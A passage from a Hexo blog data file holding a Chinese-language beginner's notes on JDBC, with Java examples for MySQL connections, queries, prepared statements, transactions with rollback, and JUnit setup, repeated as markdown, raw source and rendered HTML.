(resultSet.next()){\n            System.out.println(\"id=\"+resultSet.getObject(\"id\"));\n            System.out.println(\"name=\"+resultSet.getObject(\"name\"));\n            System.out.println(\"password=\"+resultSet.getObject(\"password\"));\n            System.out.println(\"email=\"+resultSet.getObject(\"email\"));\n            System.out.println(\"birthday=\"+resultSet.getObject(\"birthday\"));\n        }\n        //6.关闭连接,释放资源(先开后关)\n        resultSet.close();\n        statement.close();\n        connection.close();\n    }\n\n}\n\n```\n\n![image-20220117155700032](https://gitee.com/blue_satchel/images/raw/master/image-20220117155700032.png)\n\n##### 预编译\n\n可以防止sql注入\n\n```java\nString sql=\"insert into users(id,name,password,email,birthday) values (?,?,?,?,?)\";\n        PreparedStatement preparedStatement=connection.prepareStatement(sql);\n        preparedStatement.setInt(1,1);\n        preparedStatement.setString(2,\"张三\");\n\t\t.........................................\n        preparedStatement.executeUpdate(sql);\n```\n\n#### 事务\n\n要么都成功,要么都失败\n\nACID原则:保证数据的安全\n\n开启事务\n\n事务提交\tcommit()\n\n事务回滚\trollback()\n\n关闭事务\n\n例子:\n\n```\n转账:A和B\n\n如果A转账100给B,那么如果A-100和B+100就要绑定成一个事务,防止数据出现问题\nstart transaction ;#开启事务\nupdate account set money=money-100 where name='A';\nupdate account set money=money+100 where name='B';\ncommit ;\n```\n\n```java\npackage com.blue.test;\nimport org.junit.Test;\n\nimport java.sql.Connection;\nimport java.sql.DriverManager;\n\npublic class test {\n\n    Connection connection=null;\n    @Test\n    public void test(){\n        //配置信息\n        //useUnicode=true&characterEncoding=utf-8解决中文乱码\n        String url = \"jdbc:mysql://localhost:3306/jdbc?useUnicode=true&characterEncoding=utf-8\";\n        String username = \"root\";\n        String password = \"root\";\n        try {\n            //1.加载驱动,通过反射\n            Class.forName(\"com.mysql.jdbc.Driver\");\n            //2.连接数据库,代表数据表\n            connection = DriverManager.getConnection(url, username, password);\n            //3.通知数据库开启事务,false 开启\n            connection.setAutoCommit(false);\n            String sql1 = \"update account set money=money-100 where name='A'\";\n            connection.prepareStatement(sql1).executeUpdate();\n            //制造错误\n            int i = 1 / 0;\n            String sql2 = \"update account set money=money+100 where name='B'\";\n            connection.prepareStatement(sql2).executeUpdate();\n            //上面两条都执行成功了,才能提交事务\n            connection.commit();\n            connection.close();\n        }catch (Exception e){\n            try{\n                //如果出现异常,就通知数据库回滚事务\n                connection.rollback();\n            }catch (Exception ex){\n                ex.printStackTrace();\n            }\n            e.printStackTrace();\n        }\n    }\n}\n\n```\n\n\n\n#### Junit单元测试\n\n依赖,pom.xml\n\n```xml\n<dependency>\n            <groupId>junit</groupId>\n            <artifactId>junit</artifactId>\n            <version>4.12</version>\n            <scope>test</scope>\n</dependency>\n```\n\n##### 简单使用\n\n@Test注解只在方法上有效,只要加了个这个注解的方法,就可以直接运行,不需要写main了\n\n```java\npackage com.blue.test;\nimport org.junit.Test;\npublic class test {\n    @Test\n    public void test(){\n        System.out.println(123);\n    }\n}\n```\n\n","source":"_posts/JDBC.md","raw":"---\ntitle: JDBC\ndate: 2022-01-17 15:13:34\ntags:\n      - java\n      - 数据库\ncategories: java\n---\n\n## JDBC\t\n\njava database connectivity\n\nJDBC保证了多种数据库不同操作的统一,(没有什么是加一层无法解决的哈哈哈)\n\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220117151840559.png\" alt=\"image-20220117151840559\" style=\"zoom:80%;\" />\n\n需要jar包的支持:用maven导包失败了,最后手动导入了mysql的jar包\n\n![image-20220117154728636](https://gitee.com/blue_satchel/images/raw/master/image-20220117154728636.png)\n\n\n\n在IDEA中连接mysql数据库的时候记得设定时区timeZone为ShangHai\n\n##### 简单尝试\n\n![image-20220117155711276](https://gitee.com/blue_satchel/images/raw/master/image-20220117155711276.png)\n\n```java\npackage com.blue.test;\n\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class testJdbc {\n    public static void main(String[] args) throws Exception{\n        //配置信息\n        //useUnicode=true&characterEncoding=utf-8解决中文乱码\n        String url=\"jdbc:mysql://localhost:3306/jdbc?useUnicode=true&characterEncoding=utf-8\";\n        String username=\"root\";\n        String password=\"root\";\n        //1.加载驱动,(通过反射)\n        Class.forName(\"com.mysql.jdbc.Driver\");\n        //2.连接数据库,代表数据表\n        Connection connection = DriverManager.getConnection(url,username,password);\n        //3.向数据库发送SQL的对象Statement\n        //此处可以使用PreparedStatement预编译,防止sql注入\n        Statement statement= connection.createStatement();\n        //4.编写sql\n        String sql=(\"select * from users\");\n        //5.执行sql,execute的选择根据要执行的操作而异\n        //增删改都使用executeUpdate(sql)\n        ResultSet resultSet = statement.executeQuery(sql);//返回一个resultSet\n        while (resultSet.next()){\n            System.out.println(\"id=\"+resultSet.getObject(\"id\"));\n            System.out.println(\"name=\"+resultSet.getObject(\"name\"));\n            System.out.println(\"password=\"+resultSet.getObject(\"password\"));\n            System.out.println(\"email=\"+resultSet.getObject(\"email\"));\n            System.out.println(\"birthday=\"+resultSet.getObject(\"birthday\"));\n        }\n        //6.关闭连接,释放资源(先开后关)\n        resultSet.close();\n        statement.close();\n        connection.close();\n    }\n\n}\n\n```\n\n![image-20220117155700032](https://gitee.com/blue_satchel/images/raw/master/image-20220117155700032.png)\n\n##### 预编译\n\n可以防止sql注入\n\n```java\nString sql=\"insert into users(id,name,password,email,birthday) values (?,?,?,?,?)\";\n        PreparedStatement preparedStatement=connection.prepareStatement(sql);\n        preparedStatement.setInt(1,1);\n        preparedStatement.setString(2,\"张三\");\n\t\t.........................................\n        preparedStatement.executeUpdate(sql);\n```\n\n#### 事务\n\n要么都成功,要么都失败\n\nACID原则:保证数据的安全\n\n开启事务\n\n事务提交\tcommit()\n\n事务回滚\trollback()\n\n关闭事务\n\n例子:\n\n```\n转账:A和B\n\n如果A转账100给B,那么如果A-100和B+100就要绑定成一个事务,防止数据出现问题\nstart transaction ;#开启事务\nupdate account set money=money-100 where name='A';\nupdate account set money=money+100 where name='B';\ncommit ;\n```\n\n```java\npackage com.blue.test;\nimport org.junit.Test;\n\nimport java.sql.Connection;\nimport java.sql.DriverManager;\n\npublic class test {\n\n    Connection connection=null;\n    @Test\n    public void test(){\n        //配置信息\n        //useUnicode=true&characterEncoding=utf-8解决中文乱码\n        String url = \"jdbc:mysql://localhost:3306/jdbc?useUnicode=true&characterEncoding=utf-8\";\n        String username = \"root\";\n        String password = \"root\";\n        try {\n            //1.加载驱动,通过反射\n            Class.forName(\"com.mysql.jdbc.Driver\");\n            //2.连接数据库,代表数据表\n            connection = DriverManager.getConnection(url, username, password);\n            //3.通知数据库开启事务,false 开启\n            connection.setAutoCommit(false);\n            String sql1 = \"update account set money=money-100 where name='A'\";\n            connection.prepareStatement(sql1).executeUpdate();\n            //制造错误\n            int i = 1 / 0;\n            String sql2 = \"update account set money=money+100 where name='B'\";\n            connection.prepareStatement(sql2).executeUpdate();\n            //上面两条都执行成功了,才能提交事务\n            connection.commit();\n            connection.close();\n        }catch (Exception e){\n            try{\n                //如果出现异常,就通知数据库回滚事务\n                connection.rollback();\n            }catch (Exception ex){\n                ex.printStackTrace();\n            }\n            e.printStackTrace();\n        }\n    }\n}\n\n```\n\n\n\n#### Junit单元测试\n\n依赖,pom.xml\n\n```xml\n<dependency>\n            <groupId>junit</groupId>\n            <artifactId>junit</artifactId>\n            <version>4.12</version>\n            <scope>test</scope>\n</dependency>\n```\n\n##### 简单使用\n\n@Test注解只在方法上有效,只要加了个这个注解的方法,就可以直接运行,不需要写main了\n\n```java\npackage com.blue.test;\nimport org.junit.Test;\npublic class test {\n    @Test\n    public void test(){\n        System.out.println(123);\n    }\n}\n```\n\n","slug":"JDBC","published":1,"updated":"2022-01-17T08:57:17.956Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9lt0003gsw9a25za363","content":"<h2 id=\"JDBC\"><a href=\"#JDBC\" class=\"headerlink\" title=\"JDBC\"></a>JDBC</h2><p>java database connectivity</p>\n<p>JDBC保证了多种数据库不同操作的统一,(没有什么是加一层无法解决的哈哈哈)</p>\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220117151840559.png\" alt=\"image-20220117151840559\" style=\"zoom:80%;\" />\n\n<p>需要jar包的支持:用maven导包失败了,最后手动导入了mysql的jar包</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220117154728636.png\" alt=\"image-20220117154728636\"></p>\n<p>在IDEA中连接mysql数据库的时候记得设定时区timeZone为ShangHai</p>\n<h5 id=\"简单尝试\"><a href=\"#简单尝试\" class=\"headerlink\" title=\"简单尝试\"></a>简单尝试</h5><p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220117155711276.png\" alt=\"image-20220117155711276\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.blue.test;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.Connection;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.DriverManager;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.ResultSet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.Statement;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">testJdbc</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//配置信息</span></span><br><span class=\"line\">        <span class=\"comment\">//useUnicode=true&amp;characterEncoding=utf-8解决中文乱码</span></span><br><span class=\"line\">        String url=<span class=\"string\">&quot;jdbc:mysql://localhost:3306/jdbc?useUnicode=true&amp;characterEncoding=utf-8&quot;</span>;</span><br><span class=\"line\">        String username=<span class=\"string\">&quot;root&quot;</span>;</span><br><span class=\"line\">        String password=<span class=\"string\">&quot;root&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">//1.加载驱动,(通过反射)</span></span><br><span class=\"line\">        Class.forName(<span class=\"string\">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//2.连接数据库,代表数据表</span></span><br><span class=\"line\">        Connection connection = DriverManager.getConnection(url,username,password);</span><br><span class=\"line\">        <span class=\"comment\">//3.向数据库发送SQL的对象Statement</span></span><br><span class=\"line\">        <span class=\"comment\">//此处可以使用PreparedStatement预编译,防止sql注入</span></span><br><span class=\"line\">        Statement statement= connection.createStatement();</span><br><span class=\"line\">        <span class=\"comment\">//4.编写sql</span></span><br><span class=\"line\">        String sql=(<span class=\"string\">&quot;select * from users&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//5.执行sql,execute的选择根据要执行的操作而异</span></span><br><span class=\"line\">        <span class=\"comment\">//增删改都使用executeUpdate(sql)</span></span><br><span class=\"line\">        ResultSet resultSet = statement.executeQuery(sql);<span class=\"comment\">//返回一个resultSet</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (resultSet.next())&#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;id=&quot;</span>+resultSet.getObject(<span class=\"string\">&quot;id&quot;</span>));</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;name=&quot;</span>+resultSet.getObject(<span class=\"string\">&quot;name&quot;</span>));</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;password=&quot;</span>+resultSet.getObject(<span class=\"string\">&quot;password&quot;</span>));</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;email=&quot;</span>+resultSet.getObject(<span class=\"string\">&quot;email&quot;</span>));</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;birthday=&quot;</span>+resultSet.getObject(<span class=\"string\">&quot;birthday&quot;</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//6.关闭连接,释放资源(先开后关)</span></span><br><span class=\"line\">        resultSet.close();</span><br><span class=\"line\">        statement.close();</span><br><span class=\"line\">        connection.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220117155700032.png\" alt=\"image-20220117155700032\"></p>\n<h5 id=\"预编译\"><a href=\"#预编译\" class=\"headerlink\" title=\"预编译\"></a>预编译</h5><p>可以防止sql注入</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String sql=<span class=\"string\">&quot;insert into users(id,name,password,email,birthday) values (?,?,?,?,?)&quot;</span>;</span><br><span class=\"line\">        PreparedStatement preparedStatement=connection.prepareStatement(sql);</span><br><span class=\"line\">        preparedStatement.setInt(<span class=\"number\">1</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\">        preparedStatement.setString(<span class=\"number\">2</span>,<span class=\"string\">&quot;张三&quot;</span>);</span><br><span class=\"line\">\t\t.........................................</span><br><span class=\"line\">        preparedStatement.executeUpdate(sql);</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"事务\"><a href=\"#事务\" class=\"headerlink\" title=\"事务\"></a>事务</h4><p>要么都成功,要么都失败</p>\n<p>ACID原则:保证数据的安全</p>\n<p>开启事务</p>\n<p>事务提交    commit()</p>\n<p>事务回滚    rollback()</p>\n<p>关闭事务</p>\n<p>例子:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">转账:A和B</span><br><span class=\"line\"></span><br><span class=\"line\">如果A转账100给B,那么如果A-100和B+100就要绑定成一个事务,防止数据出现问题</span><br><span class=\"line\">start transaction ;#开启事务</span><br><span class=\"line\">update account set money=money-100 where name=&#x27;A&#x27;;</span><br><span class=\"line\">update account set money=money+100 where name=&#x27;B&#x27;;</span><br><span class=\"line\">commit ;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.blue.test;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.junit.Test;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.Connection;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.DriverManager;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    Connection connection=<span class=\"keyword\">null</span>;</span><br><span class=\"line\">    <span class=\"meta\">@Test</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">test</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//配置信息</span></span><br><span class=\"line\">        <span class=\"comment\">//useUnicode=true&amp;characterEncoding=utf-8解决中文乱码</span></span><br><span class=\"line\">        String url = <span class=\"string\">&quot;jdbc:mysql://localhost:3306/jdbc?useUnicode=true&amp;characterEncoding=utf-8&quot;</span>;</span><br><span class=\"line\">        String username = <span class=\"string\">&quot;root&quot;</span>;</span><br><span class=\"line\">        String password = <span class=\"string\">&quot;root&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//1.加载驱动,通过反射</span></span><br><span class=\"line\">            Class.forName(<span class=\"string\">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class=\"line\">            <span class=\"comment\">//2.连接数据库,代表数据表</span></span><br><span class=\"line\">            connection = DriverManager.getConnection(url, username, password);</span><br><span class=\"line\">            <span class=\"comment\">//3.通知数据库开启事务,false 开启</span></span><br><span class=\"line\">            connection.setAutoCommit(<span class=\"keyword\">false</span>);</span><br><span class=\"line\">            String sql1 = <span class=\"string\">&quot;update account set money=money-100 where name=&#x27;A&#x27;&quot;</span>;</span><br><span class=\"line\">            connection.prepareStatement(sql1).executeUpdate();</span><br><span class=\"line\">            <span class=\"comment\">//制造错误</span></span><br><span class=\"line\">            <span class=\"keyword\">int</span> i = <span class=\"number\">1</span> / <span class=\"number\">0</span>;</span><br><span class=\"line\">            String sql2 = <span class=\"string\">&quot;update account set money=money+100 where name=&#x27;B&#x27;&quot;</span>;</span><br><span class=\"line\">            connection.prepareStatement(sql2).executeUpdate();</span><br><span class=\"line\">            <span class=\"comment\">//上面两条都执行成功了,才能提交事务</span></span><br><span class=\"line\">            connection.commit();</span><br><span class=\"line\">            connection.close();</span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                <span class=\"comment\">//如果出现异常,就通知数据库回滚事务</span></span><br><span class=\"line\">                connection.rollback();</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span> (Exception ex)&#123;</span><br><span class=\"line\">                ex.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"Junit单元测试\"><a href=\"#Junit单元测试\" class=\"headerlink\" title=\"Junit单元测试\"></a>Junit单元测试</h4><p>依赖,pom.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>junit<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>junit<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>4.12<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"简单使用\"><a href=\"#简单使用\" class=\"headerlink\" title=\"简单使用\"></a>简单使用</h5><p>@Test注解只在方法上有效,只要加了个这个注解的方法,就可以直接运行,不需要写main了</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.blue.test;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.junit.Test;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Test</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">test</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"number\">123</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"JDBC\"><a href=\"#JDBC\" class=\"headerlink\" title=\"JDBC\"></a>JDBC</h2><p>java database connectivity</p>\n<p>JDBC保证了多种数据库不同操作的统一,(没有什么是加一层无法解决的哈哈哈)</p>\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220117151840559.png\" alt=\"image-20220117151840559\" style=\"zoom:80%;\" />\n\n<p>需要jar包的支持:用maven导包失败了,最后手动导入了mysql的jar包</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220117154728636.png\" alt=\"image-20220117154728636\"></p>\n<p>在IDEA中连接mysql数据库的时候记得设定时区timeZone为ShangHai</p>\n<h5 id=\"简单尝试\"><a href=\"#简单尝试\" class=\"headerlink\" title=\"简单尝试\"></a>简单尝试</h5><p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220117155711276.png\" alt=\"image-20220117155711276\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.blue.test;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.Connection;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.DriverManager;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.ResultSet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.Statement;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">testJdbc</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//配置信息</span></span><br><span class=\"line\">        <span class=\"comment\">//useUnicode=true&amp;characterEncoding=utf-8解决中文乱码</span></span><br><span class=\"line\">        String url=<span class=\"string\">&quot;jdbc:mysql://localhost:3306/jdbc?useUnicode=true&amp;characterEncoding=utf-8&quot;</span>;</span><br><span class=\"line\">        String username=<span class=\"string\">&quot;root&quot;</span>;</span><br><span class=\"line\">        String password=<span class=\"string\">&quot;root&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">//1.加载驱动,(通过反射)</span></span><br><span class=\"line\">        Class.forName(<span class=\"string\">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//2.连接数据库,代表数据表</span></span><br><span class=\"line\">        Connection connection = DriverManager.getConnection(url,username,password);</span><br><span class=\"line\">        <span class=\"comment\">//3.向数据库发送SQL的对象Statement</span></span><br><span class=\"line\">        <span class=\"comment\">//此处可以使用PreparedStatement预编译,防止sql注入</span></span><br><span class=\"line\">        Statement statement= connection.createStatement();</span><br><span class=\"line\">        <span class=\"comment\">//4.编写sql</span></span><br><span class=\"line\">        String sql=(<span class=\"string\">&quot;select * from users&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//5.执行sql,execute的选择根据要执行的操作而异</span></span><br><span class=\"line\">        <span class=\"comment\">//增删改都使用executeUpdate(sql)</span></span><br><span class=\"line\">        ResultSet resultSet = statement.executeQuery(sql);<span class=\"comment\">//返回一个resultSet</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (resultSet.next())&#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;id=&quot;</span>+resultSet.getObject(<span class=\"string\">&quot;id&quot;</span>));</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;name=&quot;</span>+resultSet.getObject(<span class=\"string\">&quot;name&quot;</span>));</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;password=&quot;</span>+resultSet.getObject(<span class=\"string\">&quot;password&quot;</span>));</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;email=&quot;</span>+resultSet.getObject(<span class=\"string\">&quot;email&quot;</span>));</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;birthday=&quot;</span>+resultSet.getObject(<span class=\"string\">&quot;birthday&quot;</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//6.关闭连接,释放资源(先开后关)</span></span><br><span class=\"line\">        resultSet.close();</span><br><span class=\"line\">        statement.close();</span><br><span class=\"line\">        connection.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220117155700032.png\" alt=\"image-20220117155700032\"></p>\n<h5 id=\"预编译\"><a href=\"#预编译\" class=\"headerlink\" title=\"预编译\"></a>预编译</h5><p>可以防止sql注入</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String sql=<span class=\"string\">&quot;insert into users(id,name,password,email,birthday) values (?,?,?,?,?)&quot;</span>;</span><br><span class=\"line\">        PreparedStatement preparedStatement=connection.prepareStatement(sql);</span><br><span class=\"line\">        preparedStatement.setInt(<span class=\"number\">1</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\">        preparedStatement.setString(<span class=\"number\">2</span>,<span class=\"string\">&quot;张三&quot;</span>);</span><br><span class=\"line\">\t\t.........................................</span><br><span class=\"line\">        preparedStatement.executeUpdate(sql);</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"事务\"><a href=\"#事务\" 